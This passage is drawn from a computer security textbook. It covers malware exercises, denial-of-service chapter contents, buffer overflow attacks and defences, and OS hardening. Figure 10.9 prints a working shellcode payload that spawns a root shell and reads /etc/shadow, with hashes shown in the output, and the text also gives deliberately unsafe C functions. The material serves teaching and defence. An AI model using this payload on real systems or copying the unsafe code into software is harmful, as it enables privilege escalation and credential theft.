valid\\r\\n return ALLOW_LOGIN;\\r\\n executable_start_download();\\r\\nelse return DENY_LOGIN\\r\\n executable_start_download();\\r\\nWhat type of malicious software is this?\\r\\n6.7 Many websites use a CAPTCHA image on their login page. A typical application of \\r\\nthis is in an HTML form asking for the email ID and the login password of a user. \\r\\nThe webpage also shows some numbers and letters, modified in a manner such that it \\r\\nis still easy for a human to recognize these characters. The user is then asked to recog\\ufffenize these characters and is granted login access only when they successfully enter the \\r\\ncharacters. Explain how using a CAPTCHA can help prevent email spam. What is the \\r\\nmain difficulty with using CAPTCHAs?\\r\\n6.8 What are honeypots? How are they better at resisting spam bots than CAPTCHAs?\\r\\n6.9 Suppose that while working on a course assignment you come across a software that \\r\\nseems efficient to complete the assignment. When you run the software, however, you \\r\\nobserve it keeps redirecting you to a different website and does not do the desired \\r\\ntask. Is there a threat to your computer system?\\r\\nM06_STAL0611_04_GE_C06.indd 244 10/11/17 2:51 PM\\n\\n\\n6.11 / KEY TERMS, REVIEW QUESTIONS, AND PROBLEMS 245\\r\\n6.10 Suppose you have a new smartphone and are excited about the range of apps avail\\ufffeable for it. You read about a really interesting new game that is available for your \\r\\nphone. You do a quick Web search for it and see that a version is available from one of \\r\\nthe free marketplaces. When you download and start to install this app, you are asked \\r\\nto approve the access permissions granted to it. You see that it wants permission to \\r\\n“Send SMS messages” and to “Access your address-book”. Should you be suspicious \\r\\nthat a game wants these types of permissions? What threat might the app pose to your \\r\\nsmartphone, should you grant these permissions and proceed to install it? What types \\r\\nof malware might it be?\\r\\n6.11 Assume you receive an e-mail, which appears to come from a senior manager in your \\r\\ncompany, with a subject indicating that it concerns a project that you are currently \\r\\nworking on. When you view the e-mail, you see that it asks you to review the attached \\r\\nrevised press release, supplied as a PDF document, to check that all details are correct \\r\\nbefore management releases it. When you attempt to open the PDF, the viewer pops \\r\\nup a dialog labeled “Launch File” indicating that “the file and its viewer application \\r\\nare set to be launched by this PDF file.” In the section of this dialog labeled “File,” \\r\\nthere are a number of blank lines, and finally the text “Click the ‘Open’ button to view \\r\\nthis document.” You also note that there is a vertical scroll-bar visible for this region. \\r\\nWhat type of threat might this pose to your computer system should you indeed select \\r\\nthe “Open” button? How could you check your suspicions without threatening your \\r\\nsystem? What type of attack is this type of message associated with? How many peo\\ufffeple are likely to have received this particular e-mail?\\r\\n6.12 Assume you receive an e-mail, which appears to come from an online air ticket res\\ufffeervation system, includes original logo and has following contents: “Dear Customer, \\r\\nThank you for booking your air ticket through our online reservation system. The \\r\\nPNR for your journey from City1 to City2 is JADSA and for your return journey is \\r\\nEWTEQ. You can download your tickets by logging in through this link.” Assume you \\r\\nare a frequent visitor of City1 and City2 is another city you visit very frequently. What \\r\\nform of attack is this e-mail attempting? What is the most likely mechanism used to \\r\\ndistribute this e-mail? How should you respond to such e-mails?\\r\\n6.13 Suppose you receive a letter, which appears to come from your company’s mail server \\r\\nstating that the password for your account has been changed, and that an action is \\r\\nrequired to confirm this. However, as far as you know, you have not changed the pass\\ufffeword! What may have occurred that led to the password being changed? What type of \\r\\nmalware, and on which computer systems, might have provided the necessary infor\\ufffemation to an attacker that enabled them to successfully change the password?\\r\\n6.14 One of the possible locations to deploy anti-virus software is an organization’s fire\\ufffewall so that it can obtain a larger view of the malware activity. Describe at least one \\r\\nlimitation of adopting this approach of deploying the anti-virus software. What are the \\r\\npossible ways, if any, to overcome this limitation?\\r\\nM06_STAL0611_04_GE_C06.indd 245 10/11/17 2:51 PM\\n\\n\\n7.1 Denial-of-Service Attacks\\r\\nThe Nature of Denial-of-Service Attacks\\r\\nClassic Denial-of-Service Attacks\\r\\nSource Address Spoofing\\r\\nSYN Spoofing\\r\\n7.2 Flooding Attacks\\r\\nICMP Flood\\r\\nUDP Flood\\r\\nTCP SYN Flood\\r\\n7.3 Distributed Denial-of-Service Attacks\\r\\n7.4 Application-Based Bandwidth Attacks\\r\\nSIP Flood\\r\\nHTTP-Based Attacks\\r\\n7.5 Reflector and Amplifier Attacks\\r\\nReflection Attacks\\r\\nAmplification Attacks\\r\\nDNS Amplification Attacks\\r\\n7.6 Defenses Against Denial-of-Service Attacks\\r\\n7.7 Responding to a Denial-of-Service Attack\\r\\n7.8 Key Terms, Review Questions, and Problems\\r\\nDenial-of-Service Attacks\\r\\nCHAPTER \\r\\n246\\r\\nM07_STAL0611_04_GE_C07.indd 246 10/11/17 2:54 PM'), Document(page_content='10.1 / STACK OVERFLOWS 363\\r\\nbuffer content. This is easily done (just a dozen or so more print statements in the \\r\\nPerl program), but it would have made this example bulkier and less clear.\\r\\nThe targeted program need not be a trusted system utility. Another possible \\r\\ntarget is a program providing a network service; that is, a network daemon. A com\\ufffemon approach for such programs is listening for connection requests from clients \\r\\nthen spawning a child process to handle that request. The child process typically has \\r\\nthe network connection mapped to its standard input and output. This means the \\r\\nchild program’s code may use the same type of unsafe input or buffer copy code as \\r\\nwe have seen already. This was indeed the case with the stack overflow attack used \\r\\nby the Morris Worm back in 1988. It targeted the use of gets() in the fingerd\\r\\ndaemon handling requests for the UNIX finger network service (which provided \\r\\ninformation on the users on the system).\\r\\nYet another possible target is a program, or library code, which handles com\\ufffemon document formats (e.g., the library routines used to decode and display GIF \\r\\nor JPEG images). In this case, the input is not from a terminal or network connec\\ufffetion, but from the file being decoded and displayed. If such code contains a buffer \\r\\noverflow, it can be triggered as the file contents are read, with the details encoded in \\r\\na specially corrupted image. This attack file would be distributed via e-mail, instant \\r\\nmessaging, or as part of a webpage. Because the attacker is not directly interacting \\r\\nFigure 10.9 Example Stack Overflow Attack\\r\\n$ dir -l buffer4\\r\\n-rwsr-xr-x 1 root knoppix 16571 Jul 17 10:49 buffer4\\r\\n$ whoami\\r\\nknoppix\\r\\n$ cat /etc/shadow\\r\\ncat: /etc/shadow: Permission denied\\r\\n$ cat attack1\\r\\nperl -e \\'print pack(\"H*\",\\r\\n\"90909090909090909090909090909090\" .\\r\\n\"90909090909090909090909090909090\" .\\r\\n\"9090eb1a5e31c08846078d1e895e0889\" .\\r\\n\"460cb00b89f38d4e088d560ccd80e8e1\" .\\r\\n\"ffffff2f62696e2f7368202020202020\" .\\r\\n\"202020202020202038fcffbfc0fbffbf0a\");\\r\\nprint \"whoami\\\\n\";\\r\\nprint \"cat /etc/shadow\\\\\";\\'\\r\\n$ attack1 | buffer4\\r\\nEnter value for name: Hello your yyy)DA0Apy is e?ˆ1AFF.../bin/sh...\\r\\nroot\\r\\nroot:$1$rNLId4rX$nka7JlxH7.4UJT4l9JRLk1:13346:0:99999:7:::\\r\\ndaemon:*:11453:0:99999:7:::\\r\\n...\\r\\nnobody:*:11453:0:99999:7:::\\r\\nknoppix:$1$FvZSBKBu$EdSFvuuJdKaCH8Y0IdnAv/:13346:0:99999:7:::\\r\\n...\\r\\nM10_STAL0611_04_GE_C10.indd 363 10/11/17 3:02 PM\\n\\n\\n364 CHAPTER 10 / BUFFER OVERFLOW\\r\\nwith the targeted program and system, the shellcode would typically open a network \\r\\nconnection back to a system under the attacker’s control, to return information and \\r\\npossibly receive additional commands to execute. All of this shows that buffer over\\ufffeflows can be found in a wide variety of programs, processing a range of different input, \\r\\nand with a variety of possible responses.\\r\\nThe preceding descriptions illustrate how simple shellcode can be developed \\r\\nand deployed in a stack overflow attack. Apart from just spawning a command-line \\r\\n(UNIX or DOS) shell, the attacker might want to create shellcode to perform some\\ufffewhat more complex operations, as indicated in the case just discussed. The Metasploit \\r\\nProject site includes a range of functionality in the shellcode it can generate, and the \\r\\nPacket Storm website includes a large collection of packaged shellcode, including \\r\\ncode that can:\\r\\n• Set up a listening service to launch a remote shell when connected to\\r\\n• Create a reverse shell that connects back to the hacker\\r\\n• Use local exploits that establish a shell or execve a process\\r\\n• Flush firewall rules (such as IPTables and IPChains) that currently block other \\r\\nattacks\\r\\n• Break out of a chrooted (restricted execution) environment, giving full access \\r\\nto the system\\r\\nConsiderably greater detail on the process of writing shellcode for a variety of plat\\ufffeforms, with a range of possible results, can be found in [ANLE07].\\r\\n10.2 DEFENDING AGAINST BUFFER OVERFLOWS\\r\\nWe have seen that finding and exploiting a stack buffer overflow is not that difficult. \\r\\nThe large number of exploits over the previous few decades clearly illustrates this. \\r\\nThere is consequently a need to defend systems against such attacks by either pre\\ufffeventing them, or at least detecting and aborting such attacks. This section discusses \\r\\npossible approaches to implementing such protections. These can be broadly classi\\ufffefied into two categories:\\r\\n• Compile-time defenses, which aim to harden programs to resist attacks in new \\r\\nprograms.\\r\\n• Run-time defenses, which aim to detect and abort attacks in existing programs.\\r\\nWhile suitable defenses have been known for a couple of decades, the very large \\r\\nexisting base of vulnerable software and systems hinders their deployment. Hence \\r\\nthe interest in run-time defenses, which can be deployed as operating systems and \\r\\nupdates and can provide some protection for existing vulnerable programs. Most of \\r\\nthese techniques are mentioned in [LHEE03].\\r\\nCompile-Time Defenses\\r\\nCompile-time defenses aim to prevent or detect buffer overflows by instrument\\ufffeing programs when they are compiled. The possibilities for doing this range from \\r\\nM10_STAL0611_04_GE_C10.indd 364 10/11/17 3:02 PM\\n\\n\\n10.2 / DEFENDING AGAINST BUFFER OVERFLOWS 365\\r\\nchoosing a high-level language that does not permit buffer overflows, to encouraging \\r\\nsafe coding standards, using safe standard libraries, or including additional code to \\r\\ndetect corruption of the stack frame.\\r\\nCHOICE OF PROGRAMMING LANGUAGE One possibility, as noted earlier, is to write \\r\\nthe program using a modern high-level programming language, one that has a strong \\r\\nnotion of variable type and what constitutes permissible operations on them. Such \\r\\nlanguages are not vulnerable to buffer overflow attacks because their compilers \\r\\ninclude additional code to enforce range checks automatically, removing the need \\r\\nfor the programmer to explicitly code them. The flexibility and safety provided by \\r\\nthese languages does come at a cost in resource use, both at compile time and also \\r\\nin additional code that must executed at run time to impose checks such as that on \\r\\nbuffer limits. These disadvantages are much less significant than they used to be, \\r\\ndue to the rapid increase in processor performance. Increasingly programs are being \\r\\nwritten in these languages and hence should be immune to buffer overflows in their \\r\\ncode (though if they use existing system libraries or run-time execution environ\\ufffements written in less safe languages, they may still be vulnerable). As we also noted, \\r\\nthe distance from the underlying machine language and architecture also means that \\r\\naccess to some instructions and hardware resources is lost. This limits their useful\\ufffeness in writing code, such as device drivers, that must interact with such resources. \\r\\nFor these reasons, there is still likely to be at least some code written in less safe \\r\\nlanguages such as C.\\r\\nSAFE CODING TECHNIQUES If languages such as C are being used, then program\\ufffemers need to be aware that their ability to manipulate pointer addresses and access \\r\\nmemory directly comes at a cost. It has been noted that C was designed as a systems \\r\\nprogramming language, running on systems that were vastly smaller and more con\\ufffestrained than those we now use. This meant C’s designers placed much more emphasis \\r\\non space efficiency and performance considerations than on type safety. They assumed \\r\\nthat programmers would exercise due care in writing code using these languages and \\r\\ntake responsibility for ensuring the safe use of all data structures and variables.\\r\\nUnfortunately, as several decades of experience has shown, this has not been \\r\\nthe case. This may be seen in large legacy body of potentially unsafe code in the \\r\\nLinux, UNIX, and Windows operating systems and applications, some of which are \\r\\npotentially vulnerable to buffer overflows.\\r\\nIn order to harden these systems, the programmer needs to inspect the code \\r\\nand rewrite any unsafe coding constructs in a safe manner. Given the rapid uptake of \\r\\nbuffer overflow exploits, this process has begun in some cases. A good example is the \\r\\nOpenBSD project, which produces a free, multiplatform 4.4BSD-based UNIX-like \\r\\noperating system. Among other technology changes, programmers have undertaken \\r\\nan extensive audit of the existing code base, including the operating system, standard \\r\\nlibraries, and common utilities. This has resulted in what is widely regarded as one of \\r\\nthe safest operating systems in widespread use. The OpenBSD project slogan in 2016 \\r\\nclaims: “Only two remote holes in the default install, in a heck of a long time!” This \\r\\nis a clearly enviable record. Microsoft programmers have also undertaken a major \\r\\nproject in reviewing their code base, partly in response to continuing bad publicity \\r\\nover the number of vulnerabilities, including many buffer overflow issues, that have \\r\\nbeen found in their operating systems and applications code. This has clearly been a \\r\\nM10_STAL0611_04_GE_C10.indd 365 10/11/17 3:02 PM\\n\\n\\n366 CHAPTER 10 / BUFFER OVERFLOW\\r\\ndifficult process, though they claim that Vista and later Windows operating systems \\r\\nbenefit greatly from this process.\\r\\nWith regard to programmers working on code for their own programs, the dis\\ufffecipline required to ensure that buffer overflows are not allowed to occur is a subset \\r\\nof the various safe programming techniques we will discuss in Chapter 11. Specifi\\ufffecally, it means a mindset that codes not only for normal successful execution, or for \\r\\nthe expected, but is constantly aware of how things might go wrong, and coding for \\r\\ngraceful failure, always doing something sensible when the unexpected occurs. More \\r\\nspecifically, in the case of preventing buffer overflows, it means always ensuring \\r\\nthat any code that writes to a buffer must first check to ensure sufficient space is \\r\\navailable. While the preceding examples in this chapter have emphasized issues with \\r\\nstandard library routines such as gets(), and with the input and manipulation of \\r\\nstring data, the problem is not confined to these cases. It is quite possible to write \\r\\nexplicit code to move values in an unsafe manner. Figure 10.10a shows an example \\r\\nof an unsafe byte copy function. This code copies len bytes out of the from array \\r\\ninto the to array starting at position pos and returning the end position. Unfortu\\ufffenately, this function is given no information about the actual size of the destination \\r\\nbuffer to and hence is unable to ensure an overflow does not occur. In this case, \\r\\nthe calling code should ensure that the value of size+len is not larger than the \\r\\nsize of the to array. This also illustrates that the input is not necessarily a string; it \\r\\ncould just as easily be binary data, just carelessly manipulated. Figure 10.10b shows \\r\\nan example of an unsafe byte input function. It reads the length of binary data \\r\\nexpected and then reads that number of bytes into the destination buffer. Again the \\r\\nproblem is that this code is not given any information about the size of the buffer, \\r\\nand hence is unable to check for possible overflow. These examples emphasize both \\r\\nint copy_buf(char *to, int pos, char *from, int len)\\r\\n{\\r\\n int i;\\r\\n for (i=0; i<len; i++) {\\r\\n to[pos] = from[i];\\r\\n pos++;\\r\\n }\\r\\n return pos;\\r\\n}\\r\\nFigure 10.10 Examples of Unsafe C Code\\r\\n(a) Unsafe byte copy\\r\\n(b) Unsafe byte input\\r\\nshort read_chunk(FILE fil, char *to)\\r\\n{\\r\\n short len;\\r\\n fread(&len, 2, 1, fil); /* read length of binary data */\\r\\n fread(to, 1, len, fil); /* read len bytes of binary data\\r\\n return len;\\r\\n}\\r\\nM10_STAL0611_04_GE_C10.indd 366 10/11/17 3:02 PM\\n\\n\\n10.2 / DEFENDING AGAINST BUFFER OVERFLOWS 367\\r\\nthe need to always verify the amount of space being used and the fact that problems \\r\\ncan occur both with plain C code, as well as from calling standard library routines. \\r\\nA further complexity with C is caused by array and pointer notations being almost \\r\\nequivalent, but with slightly different nuances in use. In particular, the use of pointer \\r\\narithmetic and subsequent dereferencing can result in access beyond the allocated \\r\\nvariable space, but in a less obvious manner. Considerable care is needed in coding \\r\\nsuch constructs.\\r\\nLANGUAGE EXTENSIONS AND USE OF SAFE LIBRARIES Given the problems that can\\r\\noccur in C with unsafe array and pointer references, there have been a number of \\r\\nproposals to augment compilers to automatically insert range checks on such refer\\ufffeences. While this is fairly easy for statically allocated arrays, handling dynamically \\r\\nallocated memory is more problematic, because the size information is not available \\r\\nat compile time. Handling this requires an extension to the semantics of a pointer \\r\\nto include bounds information and the use of library routines to ensure these values \\r\\nare set correctly. Several such approaches are listed in [LHEE03]. However, there is \\r\\ngenerally a performance penalty with the use of such techniques that may or may not \\r\\nbe acceptable. These techniques also require all programs and libraries that require \\r\\nthese safety features to be recompiled with the modified compiler. While this can be \\r\\nfeasible for a new release of an operating system and its associated utilities, there will \\r\\nstill likely be problems with third-party applications.\\r\\nA common concern with C comes from the use of unsafe standard library \\r\\nroutines, especially some of the string manipulation routines. One approach to \\r\\nimproving the safety of systems has been to replace these with safer variants. This \\r\\ncan include the provision of new functions, such as strlcpy() in the BSD family of \\r\\nsystems, including OpenBSD. Using these requires rewriting the source to conform to \\r\\nthe new safer semantics. Alternatively, it involves replacement of the standard string \\r\\nlibrary with a safer variant. Libsafe is a well-known example of this. It implements the \\r\\nstandard semantics but includes additional checks to ensure that the copy operations \\r\\ndo not extend beyond the local variable space in the stack frame. So while it cannot \\r\\nprevent corruption of adjacent local variables, it can prevent any modification of the \\r\\nold stack frame and return address values, and thus prevent the classic stack buffer \\r\\noverflow types of attack we examined previously. This library is implemented as a \\r\\ndynamic library, arranged to load before the existing standard libraries, and can thus \\r\\nprovide protection for existing programs without requiring them to be recompiled, \\r\\nprovided they dynamically access the standard library routines (as most programs \\r\\ndo). The modified library code has been found to typically be at least as efficient as \\r\\nthe standard libraries, and thus its use is an easy way of protecting existing programs \\r\\nagainst some forms of buffer overflow attacks.\\r\\nSTACK PROTECTION MECHANISMS An effective method for protecting programs \\r\\nagainst classic stack overflow attacks is to instrument the function entry and exit code \\r\\nto setup then check its stack frame for any evidence of corruption. If any modification \\r\\nis found, the program is aborted rather than allowing the attack to proceed. There are \\r\\nseveral approaches to providing this protection, which we will discuss next.\\r\\nStackguard is one of the best known protection mechanisms. It is a GCC com\\ufffepiler extension that inserts additional function entry and exit code. The added \\r\\nM10_STAL0611_04_GE_C10.indd 367 10/11/17 3:02 PM\\n\\n\\n368 CHAPTER 10 / BUFFER OVERFLOW\\r\\nfunction entry code writes a canary12 value below the old frame pointer address, \\r\\nbefore the allocation of space for local variables. The added function exit code checks \\r\\nthat the canary value has not changed before continuing with the usual function exit \\r\\noperations of restoring the old frame pointer and transferring control back to the \\r\\nreturn address. Any attempt at a classic stack buffer overflow would have to alter this \\r\\nvalue in order to change the old frame pointer and return addresses, and would thus \\r\\nbe detected, resulting in the program being aborted. For this defense to function suc\\ufffecessfully, it is critical that the canary value be unpredictable and should be different \\r\\non different systems. If this were not the case, the attacker would simply ensure the \\r\\nshellcode included the correct canary value in the required location. Typically, a ran\\ufffedom value is chosen as the canary value on process creation and saved as part of the \\r\\nprocesses state. The code added to the function entry and exit then use this value.\\r\\nThere are some issues with using this approach. First, it requires that all pro\\ufffegrams needing protection be recompiled. Second, because the structure of the stack \\r\\nframe has changed, it can cause problems with programs, such as debuggers, which \\r\\nanalyze stack frames. However, the canary technique has been used to recompile \\r\\nentire BSD and Linux distributions and provide it with a high level of resistance to \\r\\nstack overflow attacks. Similar functionality is available for Windows programs by \\r\\ncompiling them using Microsoft’s /GS Visual C + + compiler option.\\r\\nAnother variant to protect the stack frame is used by Stackshield and Return \\r\\nAddress Defender (RAD). These are also GCC extensions that include additional \\r\\nfunction entry and exit code. These extensions do not alter the structure of the stack \\r\\nframe. Instead, on function entry the added code writes a copy of the return address \\r\\nto a safe region of memory that would be very difficult to corrupt. On function exit \\r\\nthe added code checks the return address in the stack frame against the saved copy \\r\\nand, if any change is found, aborts the program. Because the format of the stack frame \\r\\nis unchanged, these extensions are compatible with unmodified debuggers. Again, \\r\\nprograms must be recompiled to take advantage of these extensions.\\r\\nRun-Time Defenses\\r\\nAs has been noted, most of the compile-time approaches require recompilation of \\r\\nexisting programs. Hence there is interest in run-time defenses that can be deployed \\r\\nas operating systems updates to provide some protection for existing vulnerable pro\\ufffegrams. These defenses involve changes to the memory management of the virtual \\r\\naddress space of processes. These changes act to either alter the properties of regions \\r\\nof memory, or to make predicting the location of targeted buffers sufficiently difficult \\r\\nto thwart many types of attacks.\\r\\nEXECUTABLE ADDRESS SPACE PROTECTION Many of the buffer overflow attacks, \\r\\nsuch as the stack overflow examples in this chapter, involve copying machine code \\r\\ninto the targeted buffer and then transferring execution to it. A possible defense is \\r\\nto block the execution of code on the stack, on the assumption that executable code \\r\\nshould only be found elsewhere in the processes address space.\\r\\n12Named after the miner’s canary used to detect poisonous air in a mine and thus warn the miners in time \\r\\nfor them to escape.\\r\\nM10_STAL0611_04_GE_C10.indd 368 10/11/17 3:02 PM'), Document(page_content='12.4 / APPLICATION SECURITY 427\\r\\nmeet its desired functionality, in order to reduce the number of places vulnerabilities \\r\\nmay be found. On client systems, software such as Java, PDF viewers, Flash, Web \\r\\nbrowsers, and Microsoft Office are known targets and need to be secured. On server \\r\\nsystems, software that provides remote access or service, including Web, database, and \\r\\nfile access servers, is of particular concern, since an attacker may be able to exploit \\r\\nthis to gain remote access to the system.\\r\\nEach selected service or application must be installed, configured, and then \\r\\npatched to the most recent supported secure version appropriate for the system. This \\r\\nmay be from additional packages provided with the operating system distribution, or \\r\\nfrom a separate third-party package. As with the base operating system, utilizing an \\r\\nisolated, secure build network is preferred.\\r\\nApplication Configuration\\r\\nAny application specific configuration is then performed. This may include creating \\r\\nand specifying appropriate data storage areas for the application, and making appro\\ufffepriate changes to the application or service default configuration details.\\r\\nSome applications or services may include default data, scripts, or user accounts. \\r\\nThese should be reviewed, and only retained if required, and suitably secured. A well\\ufffeknown example of this is found with Web servers, which often include a number of \\r\\nexample scripts, quite a few of which are known to be insecure. These should not be \\r\\nused as supplied, but should be removed unless needed and secured.\\r\\nAs part of the configuration process, careful consideration should be given to \\r\\nthe access rights granted to the application. Again, this is of particular concern with \\r\\nremotely accessed services, such as Web and file transfer services. The server applica\\ufffetion should not be granted the right to modify files, unless that function is specifically \\r\\nrequired. A very common configuration fault seen with Web and file transfer servers \\r\\nis for all the files supplied by the service to be owned by the same “user” account \\r\\nthat the server executes as. The consequence is that any attacker able to exploit some \\r\\nvulnerability in either the server software or a script executed by the server may be \\r\\nable to modify any of these files. The large number of “Web defacement” attacks \\r\\nis clear evidence of this type of insecure configuration. Much of the risk from this \\r\\nform of attack is reduced by ensuring that most of the files can only be read, but not \\r\\nwritten, by the server. Only those files that need to be modified, to store uploaded \\r\\nform data for example, or logging details, should be writeable by the server. Instead \\r\\nthe files should mostly be owned and modified by the users on the system who are \\r\\nresponsible for maintaining the information.\\r\\nEncryption Technology\\r\\nEncryption is a key enabling technology that may be used to secure data both in \\r\\ntransit and when stored, as we discussed in Chapter 2 and in Parts Four and Five. \\r\\nIf such technologies are required for the system, then they must be configured, and \\r\\nappropriate cryptographic keys created, signed, and secured.\\r\\nIf secure network services are provided, most likely using either TLS or IPsec, \\r\\nthen suitable public and private keys must be generated for each of them. Then X.509 \\r\\ncertificates are created and signed by a suitable certificate authority, linking each \\r\\nservice identity with the public key in use, as we will discuss in Section 23.2. If secure \\r\\nM12_STAL0611_04_GE_C12.indd 427 10/11/17 3:02 PM\\n\\n\\n428 CHAPTER 12 / OPERATING SYSTEM SECURITY\\r\\nremote access is provided using Secure Shell (SSH), then appropriate server, and \\r\\npossibly client keys, must be created.\\r\\nCryptographic file systems are another use of encryption. If desired, then these \\r\\nmust be created and secured with suitable keys.\\r\\n12.5 SECURITY MAINTENANCE\\r\\nOnce the system is appropriately built, secured, and deployed, the process of main\\ufffetaining security is continuous. This results from the constantly changing environ\\ufffement, the discovery of new vulnerabilities, and hence exposure to new threats. NIST \\r\\nSP 800-123 suggests that this process of security maintenance includes the following \\r\\nadditional steps:\\r\\n• Monitoring and analyzing logging information\\r\\n• Performing regular backups\\r\\n• Recovering from security compromises\\r\\n• Regularly testing system security\\r\\n• Using appropriate software maintenance processes to patch and update all criti\\ufffecal software, and to monitor and revise configuration as needed\\r\\nWe have already noted the need to configure automatic patching and update where \\r\\npossible, or to have a timely process to manually test and install patches on high \\r\\navailability systems, and that the system should be regularly tested using checklist or \\r\\nautomated tools where possible. We will discuss the process of incident response in \\r\\nSection 17.4. We now consider the critical logging and backup procedures.\\r\\nLogging\\r\\nNIST SP 800-123 notes that “logging is a cornerstone of a sound security posture.” \\r\\nLogging is a reactive control that can only inform you about bad things that have \\r\\nalready happened. But effective logging helps ensure that in the event of a system \\r\\nbreach or failure, system administrators can more quickly and accurately identify \\r\\nwhat happened and thus most effectively focus their remediation and recovery \\r\\nefforts. The key is to ensure you capture the correct data in the logs, and are then \\r\\nable to appropriately monitor and analyze this data. Logging information can be gen\\ufffeerated by the system, network, and applications. The range of logging data acquired \\r\\nshould be determined during the system planning stage, as it depends on the security \\r\\nrequirements and information sensitivity of the server.\\r\\nLogging can generate significant volumes of information. It is important that \\r\\nsufficient space is allocated for them. A suitable automatic log rotation and archive \\r\\nsystem should also be configured to assist in managing the overall size of the logging \\r\\ninformation.\\r\\nManual analysis of logs is tedious and is not a reliable means of detecting \\r\\nadverse events. Rather, some form of automated analysis is preferred, as it is more \\r\\nlikely to identify abnormal activity. Intrusion Detection Systems, such as those we \\r\\ndiscuss in Chapter 8, perform such automated analysis.\\r\\nWe will discuss the process of logging further in Chapter 18.\\r\\nM12_STAL0611_04_GE_C12.indd 428 10/11/17 3:02 PM\\n\\n\\n12.6 / LINUX/UNIX SECURITY 429\\r\\nData Backup and Archive\\r\\nPerforming regular backups of data on a system is another critical control that assists \\r\\nwith maintaining the integrity of the system and user data. There are many reasons \\r\\nwhy data can be lost from a system, including hardware or software failures, or acci\\ufffedental or deliberate corruption. There may also be legal or operational requirements \\r\\nfor the retention of data. Backup is the process of making copies of data at regular \\r\\nintervals, allowing the recovery of lost or corrupted data over relatively short time \\r\\nperiods of a few hours to some weeks. Archive is the process of retaining copies of \\r\\ndata over extended periods of time, being months or years, in order to meet legal and \\r\\noperational requirements to access past data. These processes are often linked and \\r\\nmanaged together, although they do address distinct needs.\\r\\nThe needs and policy relating to backup and archive should be determined \\r\\nduring the system planning stage. Key decisions include whether the backup copies \\r\\nare kept online or offline, and whether copies are stored locally or transported to a \\r\\nremote site. The trade-offs include ease of implementation and cost versus greater \\r\\nsecurity and robustness against different threats.\\r\\nA good example of the consequences of poor choices here was seen in the \\r\\nattack on an Australian hosting provider in early 2011. The attackers destroyed not \\r\\nonly the live copies of thousands of customer’s sites, but also all of the online backup \\r\\ncopies. As a result, many customers who had not kept their own backup copies lost \\r\\nall of their site content and data, with serious consequences for many of them, and \\r\\nfor the hosting provider as well. In other examples, many organizations that only \\r\\nretained onsite backups have lost all their data as a result of fire or flooding in their \\r\\nIT center. These risks must be appropriately evaluated.\\r\\n12.6 LINUX/UNIX SECURITY\\r\\nHaving discussed the process of enhancing security in operating systems through \\r\\ncareful installation, configuration, and management, we now consider some specific \\r\\naspects of this process as it relates to Unix and Linux systems. Beyond the general \\r\\nguidance in this section, we will provide a more detailed discussion of Linux security \\r\\nmechanisms in Chapter 25.\\r\\nThere are a large range of resources available to assist administrators of these \\r\\nsystems, including many texts, for example [NEME10], online resources such as the \\r\\n“Linux Documentation Project,” and specific system hardening guides such as those \\r\\nprovided by the “NSA—Security Configuration Guides.” These resources should be \\r\\nused as part of the system security planning process in order to incorporate proce\\ufffedures appropriate to the security requirements identified for the system.\\r\\nPatch Management\\r\\nEnsuring that system and application code is kept up to date with security patches is \\r\\na widely recognized and critical control for maintaining security.\\r\\nModern Unix and Linux distributions typically include tools for automatically \\r\\ndownloading and installing software updates, including security updates, which can \\r\\nminimize the time a system is vulnerable to known vulnerabilities for which patches \\r\\nM12_STAL0611_04_GE_C12.indd 429 10/11/17 3:02 PM\\n\\n\\n430 CHAPTER 12 / OPERATING SYSTEM SECURITY\\r\\nexist. For example, Red Hat, Fedora, and CentOS include up2date or yum; SuSE \\r\\nincludes yast; and Debian uses apt-get, though you must run it as a cron job for \\r\\nautomatic updates. It is important to configure whichever update tool is provided on \\r\\nthe distribution in use, to install at least critical security patches in a timely manner.\\r\\nAs noted earlier, high availability systems that do not run automatic updates, \\r\\nas they may possibly introduce instability, should validate all patches on test systems \\r\\nbefore deploying them to production systems.\\r\\nApplication and Service Configuration\\r\\nConfiguration of applications and services on Unix and Linux systems is most com\\ufffemonly implemented using separate text files for each application and service. System\\ufffewide configuration details are generally located either in the “/etc” directory or \\r\\nin the installation tree for a specific application. Where appropriate, individual user \\r\\nconfigurations that can override the system defaults are located in hidden “dot” files \\r\\nin each user’s home directory. The name, format, and usage of these files are very \\r\\nmuch dependent on the particular system version and applications in use. Hence, the \\r\\nsystems administrators responsible for the secure configuration of such a system must \\r\\nbe suitably trained and familiar with them.\\r\\nTraditionally, these files were individually edited using a text editor, with any \\r\\nchanges made taking effect either when the system was next rebooted or when the \\r\\nrelevant process was sent a signal indicating that it should reload its configuration \\r\\nsettings. Current systems often provide a GUI interface to these configuration files to \\r\\nease management for novice administrators. Using such a manager may be appropri\\ufffeate for small sites with a limited number of systems. Organizations with larger num\\ufffebers of systems may instead employ some form of centralized management, with a \\r\\ncentral repository of critical configuration files that can be automatically customized \\r\\nand distributed to the systems they manage.\\r\\nThe most important changes needed to improve system security are to dis\\ufffeable services, especially remotely accessible services, and applications, that are not \\r\\nrequired, and to then ensure that applications and services that are needed are appro\\ufffepriately configured, following the relevant security guidance for each. We will provide \\r\\nfurther details on this in Section 25.5.\\r\\nUsers, Groups, and Permissions\\r\\nAs we describe in Sections 4.4 and 25.3, Unix and Linux systems implement discre\\ufffetionary access control to all file system resources. These include not only files and \\r\\ndirectories but also devices, processes, memory, and indeed most system resources. \\r\\nAccess is specified as granting read, write, and execute permissions to each of owner, \\r\\ngroup, and others, for each resource, as shown in Figure 4.5. These are set using the \\r\\nchmod command. Some systems also support extended file attributes with access \\r\\ncontrol lists that provide more flexibility, by specifying these permissions for each \\r\\nentry in a list of users and groups. These extended access rights are typically set and \\r\\ndisplayed using the getfacl and setfacl commands. These commands can also \\r\\nbe used to specify set user or set group permissions on the resource.\\r\\nInformation on user accounts and group membership are traditionally stored \\r\\nin the /etc/passwd and /etc/group files, though modern systems also have the \\r\\nM12_STAL0611_04_GE_C12.indd 430 10/11/17 3:02 PM\\n\\n\\n12.6 / LINUX/UNIX SECURITY 431\\r\\nability to import these details from external repositories queried using LDAP or NIS \\r\\nfor example. These sources of information, and indeed of any associated authentica\\ufffetion credentials, are specified in the PAM (pluggable authentication module) configu\\uffferation for the system, often using text files in the /etc/pam.d directory.\\r\\nIn order to partition access to information and resources on the system, users \\r\\nneed to be assigned to appropriate groups granting them any required access. The \\r\\nnumber and assignments to groups should be decided during the system security \\r\\nplanning process, and then configured in the appropriate information repository, \\r\\nwhether locally using the configuration files in /etc, or on some centralized data\\ufffebase. At this time, any default or generic users supplied with the system should be \\r\\nchecked, and removed if not required. Other accounts that are required, but are not \\r\\nassociated with a user that needs to login, should have 